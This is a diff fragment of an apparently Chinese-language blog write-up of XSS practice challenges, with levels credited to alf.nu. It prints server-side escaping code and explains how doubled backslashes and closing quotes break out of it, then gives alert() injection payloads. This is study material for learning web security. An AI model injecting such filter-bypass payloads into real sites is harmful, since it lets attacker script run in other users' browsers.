+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>(s)
+            .replace(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)
+            .replace(<span class="hljs-regexp">/`/g</span>, <span class="hljs-string">&#x27;\\`&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\74&#x27;</span>)
+            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;\\76&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&#x27;\\n&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&#x27;\\r&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\t/g</span>, <span class="hljs-string">&#x27;\\t&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\f/g</span>, <span class="hljs-string">&#x27;\\f&#x27;</span>)
+            .replace(<span class="hljs-regexp">/\v/g</span>, <span class="hljs-string">&#x27;\\v&#x27;</span>)
+            <span class="hljs-comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span>
+            .replace(<span class="hljs-regexp">/\0/g</span>, <span class="hljs-string">&#x27;\\0&#x27;</span>)
+  &#125;
+  s = escapeJs(s)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span>
+<span class="hljs-string">&lt;script&gt;</span>
+<span class="hljs-string">  var url = &#x27;javascript:console.log(&quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;)&#x27;</span>
+<span class="hljs-string">  var a = document.createElement(&#x27;a&#x27;)</span>
+<span class="hljs-string">  a.href = url</span>
+<span class="hljs-string">  document.body.appendChild(a)</span>
+<span class="hljs-string">  a.click()</span>
+<span class="hljs-string">&lt;/script&gt;</span>
+<span class="hljs-string">`</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span>
+<span class="javascript"><span class="xml">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;&quot;)&#x27;</span></span></span>
+<span class="javascript"><span class="xml">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span>
+<span class="javascript"><span class="xml">  a.href = url</span></span>
+<span class="javascript"><span class="xml">  <span class="hljs-built_in">document</span>.body.appendChild(a)</span></span>
+<span class="javascript"><span class="xml">  a.click()</span></span>
+<span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p>服务器过滤了一大堆字符,并在其前面添加反斜杠进行转义</p>
 <p>注意<code>console.log(&quot;$&#123;s&#125;&quot;)</code>,当我们输入一个双引号<code>&quot;</code>,正则会变成<code>\&quot;</code>,然后整条语句变成<code>console.log(&quot;\&quot;&quot;)</code>.这样反斜杠就失去转义的作用</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br><span class="hljs-string">&quot;);alert(&quot;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+<span class="hljs-string">&quot;);alert(&quot;</span><span class="hljs-number">1</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-18.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
-<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  s = s.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-comment">// from alf.nu</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;
+  s = s.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p>服务器对双引号进行过滤,转为<code>\\&quot;</code>,把双引号和括号进行补全就能绕过</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>\<span class="hljs-string">&quot;);alert(1)//</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+\<span class="hljs-string">&quot;);alert(1)//</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-19.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
